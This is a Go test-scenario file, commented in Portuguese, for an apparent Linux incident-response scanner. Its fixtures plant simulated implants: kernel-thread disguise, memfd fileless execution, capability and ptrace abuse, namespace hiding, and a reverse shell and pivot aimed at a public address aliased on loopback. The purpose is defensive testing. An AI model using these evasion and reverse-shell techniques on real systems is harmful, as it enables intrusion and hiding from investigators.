package scenario

// Matriz de userland. O objetivo não é cobrir distro por distro, é provar que a
// ferramenta SONDA em vez de detectar: layouts diferentes de cron, systemd,
// base de pacotes e libc.
var (
	matriz  = []string{"debian:12", "alpine:3.20"}
	minimal = []string{"alpine:3.20"} // rápido, e sem glibc: prova o binário estático
)

func init() {
	// ---------------------------------------------------------------- negativos
	//
	// Valem tanto quanto os positivos. Um check que dispara em host limpo é
	// ruído que treina o operador a ignorar o relatório inteiro.

	Register(Scenario{
		ID:     "00-limpo",
		Desc:   "contêiner intocado não pode produzir achado nenhum",
		Images: matriz,
		Expect: nil,
		Forbid: []string{
			"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise",
			"proc.suspicious_path", "proc.caps_unexpected", "proc.tracer",
			"proc.maps_rwx_anon", "proc.ns_divergent",
			"correlate.revshell", "net.pivot",
		},
		Exit: 0,
	})

	Register(Scenario{
		ID:   "01-sem-root",
		Desc: "sem root a cobertura DEGRADA e o exit não pode ser 0",
		// É o invariante central da ferramenta: distinguir "não achei" de
		// "não consegui olhar". Antes da revisão, esta execução saía OK/0 com
		// 246 de 303 processos ilegíveis.
		Images:           matriz,
		User:             "1000",
		Plant:            `sleep 300 &`,
		Exit:             1,
		MustBeIncomplete: true,
	})

	Register(Scenario{
		ID:     "02-kthread-real",
		Desc:   "thread de kernel legítima não dispara: ela não tem exe",
		Images: minimal,
		Forbid: []string{"proc.kthread_disguise"},
		Exit:   0,
	})

	// ---------------------------------------------------------------- positivos

	Register(Scenario{
		ID:     "10-kthread-disguise",
		Desc:   "implante renomeado com exec -a para se passar por thread de kernel",
		Images: matriz,
		// Duas armadilhas de portabilidade que a matriz revelou:
		//   1. exec -a é builtin do BASH; debian usa dash e alpine usa busybox ash
		//   2. o /bin/sleep do Alpine É o busybox, que despacha pelo argv[0] —
		//      renomeá-lo faz ele procurar um applet inexistente e sair
		// O alvo precisa ser um binário próprio, estático e sem despacho por nome.
		Plant: `/helper argv0 "[kworker/9:2]" /helper sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.kthread_disguise", Sev: "CRITICAL"}},
		// Não pode confundir com os outros dois checks de exe.
		Forbid:         []string{"proc.memfd_exec"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:     "11-exe-apagado",
		Desc:   "binário apagado com o processo ainda rodando",
		Images: matriz,
		// Mesma razão do cenário acima: copiar o /bin/sleep do Alpine copia o
		// busybox inteiro, e invocá-lo como ".y" não resolve applet nenhum.
		Plant: `cp /helper /tmp/.y
			/tmp/.y sleep 300 &
			sleep 0.4
			rm -f /tmp/.y`,
		// WARN, não CRITICAL: é o que acontece em TODA atualização de pacote
		// com o serviço no ar. A severidade precisa refletir isso.
		Expect:         []Expect{{ID: "proc.exe_deleted", Sev: "WARN"}},
		Forbid:         []string{"proc.memfd_exec"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "12-pid1-nao-eh-isento",
		Desc: "PID 1 é avaliado como qualquer outro processo",
		// Regressão do pior achado da revisão: a versão anterior isentava toda
		// a cadeia de ancestrais, e como a caminhada terminava em 1, o PID 1
		// ficava fora de todo check em todo host — junto com o sshd que
		// costuma ser ancestral da sessão de IR.
		Images: minimal,
		Plant:  ``, // o próprio PID 1 do contêiner é o alvo
		Args:   []string{"-v"},
		Exit:   -1,
	})

	Register(Scenario{
		ID:   "13-memfd-fileless",
		Desc: "binário executado de memória anônima: nunca esteve em disco",
		// A forma que anula §8 (find), §5.4 (hash) e §24 (pacote) de uma vez:
		// não há caminho, não há inode, não há o que comparar. E matar o
		// processo destrói a única cópia existente.
		Images: matriz,
		Plant: `/helper memfd /helper sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.memfd_exec", Sev: "CRITICAL"}},
		// memfd tem check próprio: não pode ser contado também como exe apagado.
		Forbid:         []string{"proc.exe_deleted"},
		Exit:           2,
		MustBeComplete: true,
	})

	// -------------------------------------------------- caminho, privilégio, memória

	Register(Scenario{
		ID:     "14-caminho-suspeito",
		Desc:   "binário rodando de /tmp — onde instalação nenhuma põe binário",
		Images: matriz,
		Plant: `cp /helper /tmp/.x
			/tmp/.x sleep 300 &
			sleep 0.4`,
		Expect: []Expect{{ID: "proc.suspicious_path", Sev: "WARN"}},
		// O binário existe e não foi apagado: os checks de exe não têm o que
		// dizer aqui, e contar o mesmo processo três vezes infla a triagem.
		Forbid:         []string{"proc.exe_deleted", "proc.memfd_exec"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "15-capability-sem-root",
		Desc: "processo de usuário comum com capability que vale por root",
		// Como capability substitui o SUID (runbook §3.7): PR_SET_KEEPCAPS
		// preserva o conjunto permitido através do setuid. `ps` mostra uid 1000
		// e o processo pode virar root a qualquer momento.
		//
		// As duas capabilities usadas estão no conjunto PADRÃO do Docker: o
		// cenário não precisa de --cap-add, e por isso roda na matriz inteira.
		Images: matriz,
		Plant: `/helper caps 1000 &
			sleep 0.5`,
		Expect: []Expect{{ID: "proc.caps_unexpected", Sev: "WARN"}},
		Exit:   1,
		// Trocar de uid zera o flag dumpable, e aí nem o root do contêiner lê
		// o exe daquele processo sem CAP_SYS_PTRACE. A cobertura CAI — e é
		// isso mesmo que a ferramenta precisa dizer.
		MustBeIncomplete: true,
	})

	Register(Scenario{
		ID:   "16-ptrace",
		Desc: "processo sob ptrace: outro processo controla a memória dele",
		// Pai/filho, que é o que ptrace_scope=1 permite — o padrão da maioria
		// das distros. Injeção sem arquivo nenhum (runbook §3.16).
		Images: matriz,
		Plant: `/helper trace &
			sleep 0.6`,
		Expect:         []Expect{{ID: "proc.tracer", Sev: "WARN"}},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "17-rwx-anonimo",
		Desc: "memória gravável, executável e sem arquivo por trás",
		// A assinatura que o malfind procura, e que MemoryDenyWriteExecute=yes
		// torna impossível (runbook §34.1).
		Images: minimal,
		Plant: `/helper rwx &
			sleep 0.4`,
		Expect:         []Expect{{ID: "proc.maps_rwx_anon", Sev: "WARN"}},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "18-jit-de-sistema-nao-dispara",
		Desc: "runtime com JIT em diretório de sistema é pulado",
		// O descarte que decide se o check é usável: sem ele, todo host com Java
		// ou Node vira parede de aviso. A outra metade do par — o mesmo nome
		// rodando de /tmp, que NÃO é isentado — está no teste unitário, porque
		// depende só da regra e não do /proc.
		Images: minimal,
		Plant: `cp /helper /usr/bin/node
			/usr/bin/node rwx &
			sleep 0.4`,
		Forbid: []string{"proc.maps_rwx_anon", "proc.suspicious_path"},
		Exit:   0,
	})

	Register(Scenario{
		ID:   "19-namespace-proprio",
		Desc: "unshare fora de container e fora de unit: esconderijo sem rootkit",
		// Explica os dois "impossíveis" da §3.15 sem precisar de rootkit — o
		// arquivo que o `ls` não acha e a conexão que o `ss` não lista. O
		// cgroup aqui é `/`: nem container nem unit, que são os dois descartes.
		Images: matriz,
		Caps:   []string{"SYS_ADMIN"}, // unshare exige
		Plant: `unshare -n /helper sleep 300 &
			sleep 0.5`,
		Expect:         []Expect{{ID: "proc.ns_divergent", Sev: "WARN"}},
		Exit:           1,
		MustBeComplete: true,
	})

	// ------------------------------------------------------------------- rede
	//
	// Os quatro cenários abaixo existem em pares: uma forma que precisa
	// disparar e a forma LEGÍTIMA quase idêntica que não pode. É o par que dá
	// valor — sozinho, o positivo não prova que o check discrimina.
	//
	// Endereço público sem rede: `--network=none` mais apelidos em `lo`. Para
	// quem classifica, 51.91.190.241 é público; para a máquina, nada sai do
	// namespace.

	Register(Scenario{
		ID:        "40-revshell",
		Desc:      "fd 0, 1 e 2 no mesmo socket, saindo para endereço público",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 51.91.190.241/32 dev lo
			/helper listen 51.91.190.241:9001 &
			sleep 0.4
			/helper revshell 51.91.190.241:9001 &
			sleep 0.5`,
		Expect: []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
		// O outro lado da conexão está no mesmo host e no mesmo namespace: o
		// processo que ESCUTA não pode ser lido como pivô nem como shell.
		Forbid:         []string{"net.pivot"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "41-socket-activation-nao-eh-revshell",
		Desc: "ativação por socket tem a MESMA forma e não pode disparar",
		// O falso positivo que a revisão de código encontrou. systemd com
		// StandardInput=socket e inetd entregam o socket em fd 0, 1 e 2 — igual
		// a um shell reverso. O que separa é a DIREÇÃO, e este cenário é o que
		// impede alguém de "simplificar" o check removendo essa checagem.
		//
		// Roda na matriz inteira e sem privilégio de rede: loopback basta,
		// porque o que está sob teste é a direção, não o escopo do peer.
		Images: matriz,
		Plant: `/helper accept 127.0.0.1:9002 &
			sleep 0.4
			/helper connect 127.0.0.1:9002 &
			sleep 0.5`,
		Forbid:         []string{"correlate.revshell", "net.pivot"},
		Exit:           0,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:        "42-pivot",
		Desc:      "mesmo processo com saída externa e saída interna: a VM é caminho",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 51.91.190.241/32 dev lo
			ip addr add 10.0.0.9/32 dev lo
			/helper listen 51.91.190.241:9001 &
			/helper listen 10.0.0.9:9002 &
			sleep 0.4
			/helper connect 51.91.190.241:9001 10.0.0.9:9002 &
			sleep 0.5`,
		Expect: []Expect{{ID: "net.pivot", Sev: "WARN"}},
		// Sem dup2 sobre os descritores padrão não há assinatura de shell: os
		// dois checks olham a mesma tabela e não podem se confundir.
		Forbid:         []string{"correlate.revshell"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "43-proxy-reverso-nao-eh-pivo",
		Desc: "proxy reverso fala com os dois lados e NÃO é pivô",
		// O defeito que a revisão encontrou no check: sem direção, todo nginx
		// que serve tráfego público virava pivô. A diferença é inteira aqui —
		// tráfego externo de ENTRADA, não de saída.
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 51.91.190.241/32 dev lo
			ip addr add 10.0.0.9/32 dev lo
			/helper listen 10.0.0.9:9002 &
			sleep 0.3
			/helper proxy 51.91.190.241:9001 10.0.0.9:9002 &
			sleep 0.3
			/helper connect 51.91.190.241:9001 &
			sleep 0.5`,
		Forbid:         []string{"net.pivot", "correlate.revshell"},
		Exit:           0,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "44-wtf-revshell",
		Desc: "wtf enxerga o que precisa ser enxergado em 1s, e sai com o mesmo código",
		// O wtf tem seleção, orçamento e renderização próprios. O que NÃO pode
		// mudar é o contrato: mesmo JSONL, mesmo exit code — é por ele que a
		// triagem de frota se ordena.
		Images:    minimal,
		Cmd:       "wtf",
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 51.91.190.241/32 dev lo
			/helper listen 51.91.190.241:9001 &
			sleep 0.4
			/helper revshell 51.91.190.241:9001 &
			sleep 0.5`,
		Expect:         []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
		Exit:           2,
		MustBeComplete: true,
	})

	// ---------------------------------------------------------------- modo image

	Register(Scenario{
		ID:   "20-image-symlink-absoluto",
		Desc: "imagem com symlink absoluto não pode ler o host do analista",
		// Symlink absoluto é NORMAL em rootfs real (/etc/os-release →
		// /usr/lib/os-release). Antes da correção, varrer uma imagem imprimia
		// o hostname e a distro do ANALISTA atribuídos a ela.
		Images: minimal,
		Mode:   Image,
		Plant: `ln -sf /etc/hostname /etc/hostname.link
			rm -f /etc/os-release && ln -s /nao/existe/os-release /etc/os-release`,
		Exit: -1,
	})

	Register(Scenario{
		ID:     "21-image-sem-processo",
		Desc:   "imagem montada não tem processo: os checks de proc viram NÃO VERIFICADO",
		Images: minimal,
		Mode:   Image,
		// Zero processos numa imagem não é "host limpo" — é ausência de fonte,
		// e precisa aparecer como tal.
		Forbid:           []string{"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise"},
		MustBeIncomplete: true,
		Exit:             1,
	})

	// ------------------------------------------------------- fora do contêiner

	Register(Scenario{
		ID:   "90-kernel-antigo",
		Desc: "procfs de kernel 2.6.32 (campos ausentes em /proc/<pid>/status)",
		Untestable: "contêiner compartilha o kernel do host: uma imagem centos:6 testa o " +
			"LAYOUT de userland, não o procfs antigo. Exige VM.",
	})

	// ----------------------------------------------------------------- VM
	//
	// Kernel próprio. É o que contêiner não alcança, porque compartilha o do
	// host: opção de mount de /proc, sysctl, módulo, cgroup, eBPF.

	Register(Scenario{
		ID:   "30-hidepid-root",
		Desc: "com root, hidepid=2 não esconde nada: o implante é visto",
		Mode: VM,
		Setup: `adduser -D -u 1000 app
			/helper argv0 "[kworker/0:9]" /helper sleep 300 &
			sleep 0.4
			mount -o remount,hidepid=2 /proc`,
		Expect:         []Expect{{ID: "proc.kthread_disguise", Sev: "CRITICAL"}},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "31-hidepid-sem-root",
		Desc: "sem root sob hidepid=2 o implante é INVISÍVEL — e a ferramenta precisa DIZER isso",
		// É o defeito que a revisão de código encontrou, no ambiente exato em
		// que ele se manifestava: a ferramenta via 4 de 310 processos e
		// imprimia "RESULT: OK, exit 0" com um implante CRITICAL bem ali.
		// A asserção é dupla e é o coração da suíte: o achado NÃO aparece
		// (nada a fazer, ele é mesmo invisível) E o veredito NÃO pode ser OK.
		Mode: VM,
		User: "app",
		Setup: `adduser -D -u 1000 app
			/helper argv0 "[kworker/0:9]" /helper sleep 300 &
			sleep 0.4
			mount -o remount,hidepid=2 /proc`,
		Forbid:           []string{"proc.kthread_disguise"},
		MustBeIncomplete: true,
		Exit:             1,
	})

	Register(Scenario{
		ID:   "92-userland-trojanizado",
		Desc: "ls/ss/ps substituídos não podem mudar o resultado da CLI",
		Untestable: "prova a decisão da SPEC 4 (binário estático, sem chamar binário do " +
			"host). Precisa de uma imagem com userland adulterado de propósito — " +
			"vale construir quando a fase 7 (integridade) existir.",
	})
}
